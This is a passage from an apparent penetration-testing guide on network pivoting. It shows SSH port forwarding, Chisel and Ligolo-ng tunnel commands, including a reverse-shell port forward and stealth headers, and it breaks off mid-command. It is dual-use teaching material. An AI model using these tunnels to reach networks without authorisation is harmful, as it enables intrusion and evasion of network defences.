<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Basic remote port forwarding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-R</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">bind_address:</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain">remote_port:destination_host:destination_port user@ssh_server</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Forward pivot host port 8080 to local web server</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-R</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain">:127.0.0.1:80 user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Enable GatewayPorts for external access</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-o</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">GatewayPorts</span><span class="token operator">=</span><span class="token plain">yes </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-R</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain">:127.0.0.1:80 user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Reverse shell establishment</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-R</span><span class="token plain"> </span><span class="token number">4444</span><span class="token plain">:127.0.0.1:4444 user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Database access through reverse tunnel</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-R</span><span class="token plain"> </span><span class="token number">3306</span><span class="token plain">:database_server:3306 user@pivot_host</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="23-dynamic-port-forwarding-socks-proxy">2.3 Dynamic Port Forwarding (SOCKS Proxy)<a href="#23-dynamic-port-forwarding-socks-proxy" class="hash-link" aria-label="Direct link to 2.3 Dynamic Port Forwarding (SOCKS Proxy)" title="Direct link to 2.3 Dynamic Port Forwarding (SOCKS Proxy)" translate="no">‚Äã</a></h3>
<p>Dynamic port forwarding establishes a SOCKS proxy server on the client machine:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Basic SOCKS proxy on port 9050</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-D</span><span class="token plain"> </span><span class="token number">9050</span><span class="token plain"> user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># SOCKS proxy with specific binding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-D</span><span class="token plain"> </span><span class="token number">127.0</span><span class="token plain">.0.1:9050 user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Background SOCKS proxy with compression</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-fN</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-C</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-D</span><span class="token plain"> </span><span class="token number">9050</span><span class="token plain"> user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># SOCKS proxy with connection multiplexing</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-M</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-S</span><span class="token plain"> /tmp/ssh-socket </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-fN</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-D</span><span class="token plain"> </span><span class="token number">9050</span><span class="token plain"> user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Reuse existing connection</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-S</span><span class="token plain"> /tmp/ssh-socket </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-O</span><span class="token plain"> check user@pivot_host</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="24-advanced-ssh-configuration">2.4 Advanced SSH Configuration<a href="#24-advanced-ssh-configuration" class="hash-link" aria-label="Direct link to 2.4 Advanced SSH Configuration" title="Direct link to 2.4 Advanced SSH Configuration" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># ~/.ssh/config optimization for pivoting</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host pivot</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    HostName pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    User username</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Port </span><span class="token number">22</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    DynamicForward </span><span class="token number">9050</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    LocalForward </span><span class="token number">8080</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.1.100:80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ControlMaster auto</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ControlPath ~/.ssh/sockets/%r@%h-%p</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ControlPersist </span><span class="token number">600</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Compression </span><span class="token function" style="color:rgb(80, 250, 123)">yes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ServerAliveInterval </span><span class="token number">60</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ServerAliveCountMax </span><span class="token number">3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    TCPKeepAlive </span><span class="token function" style="color:rgb(80, 250, 123)">yes</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="25-ssh-tunneling-through-http-proxies">2.5 SSH Tunneling Through HTTP Proxies<a href="#25-ssh-tunneling-through-http-proxies" class="hash-link" aria-label="Direct link to 2.5 SSH Tunneling Through HTTP Proxies" title="Direct link to 2.5 SSH Tunneling Through HTTP Proxies" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Connect through HTTP proxy using ProxyCommand</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-o</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">ProxyCommand</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;nc --proxy-type http --proxy proxy_host:8080 %h %p&#x27;</span><span class="token plain"> user@target</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Using corkscrew for HTTP proxy traversal</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-o</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">ProxyCommand</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;corkscrew proxy_host 8080 %h %p&#x27;</span><span class="token plain"> user@target</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># SOCKS proxy traversal</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-o</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">ProxyCommand</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;nc --proxy-type socks5 --proxy socks_proxy:1080 %h %p&#x27;</span><span class="token plain"> user@target</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="3-chisel-framework-http-tunneled-network-pivoting">3. Chisel Framework: HTTP-Tunneled Network Pivoting<a href="#3-chisel-framework-http-tunneled-network-pivoting" class="hash-link" aria-label="Direct link to 3. Chisel Framework: HTTP-Tunneled Network Pivoting" title="Direct link to 3. Chisel Framework: HTTP-Tunneled Network Pivoting" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>Ensure the Chisel binary is available on both server and client machines before executing these commands. Replace server_ip, username<!-- -->:password<!-- -->, ports, and interface names to match your environment.</p></div></div>
<p>Chisel implements a fast TCP/UDP tunnel transported over HTTP, secured via SSH-like encryption, optimized for restrictive network environments.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="31-server-configuration-and-management">3.1 Server Configuration and Management<a href="#31-server-configuration-and-management" class="hash-link" aria-label="Direct link to 3.1 Server Configuration and Management" title="Direct link to 3.1 Server Configuration and Management" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Basic server with authentication</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel server </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> username:password</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Server with reverse tunneling capability</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel server </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> username:password </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--reverse</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># HTTPS server with custom certificates</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel server </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">443</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--key</span><span class="token plain"> private.key </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--cert</span><span class="token plain"> cert.pem </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> user:pass</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Server with specific binding interface</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel server </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--host</span><span class="token plain"> </span><span class="token number">0.0</span><span class="token plain">.0.0 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> user:pass</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Server with logging configuration</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel server </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> user:pass --log-level debug </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--logfile</span><span class="token plain"> chisel.log</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Server with backend restrictions</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel server </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--port</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> user:pass </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--backend</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;127.0.0.1:*&quot;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="32-client-configuration-methodologies">3.2 Client Configuration Methodologies<a href="#32-client-configuration-methodologies" class="hash-link" aria-label="Direct link to 3.2 Client Configuration Methodologies" title="Direct link to 3.2 Client Configuration Methodologies" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Basic SOCKS proxy establishment</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel client </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> username:password server_ip:8080 R:socks</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># SOCKS proxy on specific port</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel client </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> username:password server_ip:8080 R:5000:socks</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Local port forwarding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel client </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> username:password server_ip:8080 </span><span class="token number">3306</span><span class="token plain">:internal_db:3306</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Remote port forwarding (reverse)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel client </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> username:password server_ip:8080 R:8000:127.0.0.1:80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Multiple tunnel establishment</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel client server_ip:8080 </span><span class="token number">3306</span><span class="token plain">:db:3306 </span><span class="token number">8888</span><span class="token plain">:web:80 </span><span class="token number">1433</span><span class="token plain">:sql:1433 R:socks</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># UDP tunneling support</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel client server_ip:8080 R:53:dns_server:53/udp</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="33-advanced-chisel-configurations">3.3 Advanced Chisel Configurations<a href="#33-advanced-chisel-configurations" class="hash-link" aria-label="Direct link to 3.3 Advanced Chisel Configurations" title="Direct link to 3.3 Advanced Chisel Configurations" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Connection through corporate proxies</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel client </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> user:pass </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--proxy</span><span class="token plain"> https://corp-proxy:8080 server_ip:8080 R:socks</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Fingerprint verification for security</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel client </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--fingerprint</span><span class="token plain"> xx:xx:xx:xx </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> user:pass server_ip:8080 R:socks</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Keepalive for unstable connections</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel client </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--keepalive</span><span class="token plain"> 10s --max-retry-count </span><span class="token number">5</span><span class="token plain"> server_ip:8080 R:socks</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Custom headers for stealth</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel client </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--header</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;User-Agent: Mozilla/5.0&quot;</span><span class="token plain"> server_ip:8080 R:socks</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># IPv6 support</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel client </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> user:pass </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">::1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain">:8080 R:socks</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Compression enabled</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chisel client </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--auth</span><span class="token plain"> user:pass server_ip:8080 R:socks </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--compression</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="4-ligolo-ng-transparent-network-tunneling">4. Ligolo-ng: Transparent Network Tunneling<a href="#4-ligolo-ng-transparent-network-tunneling" class="hash-link" aria-label="Direct link to 4. Ligolo-ng: Transparent Network Tunneling" title="Direct link to 4. Ligolo-ng: Transparent Network Tunneling" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>The following examples require both Ligolo-ng proxy and agent binaries to be compiled and accessible on the attacker and target hosts. IP addresses, TUN interface names, and certificate files should be adjusted as per your lab or operational setup.</p></div></div>
<p>Ligolo-ng implements a sophisticated userland networking stack through TUN interface manipulation, providing transparent network access without SOCKS proxy requirements.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="41-infrastructure-setup-and-configuration">4.1 Infrastructure Setup and Configuration<a href="#41-infrastructure-setup-and-configuration" class="hash-link" aria-label="Direct link to 4.1 Infrastructure Setup and Configuration" title="Direct link to 4.1 Infrastructure Setup and Configuration" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Proxy server preparation (Linux)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">sudo</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">ip</span><span class="token plain"> tuntap </span><span class="token function" style="color:rgb(80, 250, 123)">add</span><span class="token plain"> dev ligolo mode tun</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">sudo</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">ip</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">link</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">set</span><span class="token plain"> ligolo up</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">sudo</span><span class="token plain"> 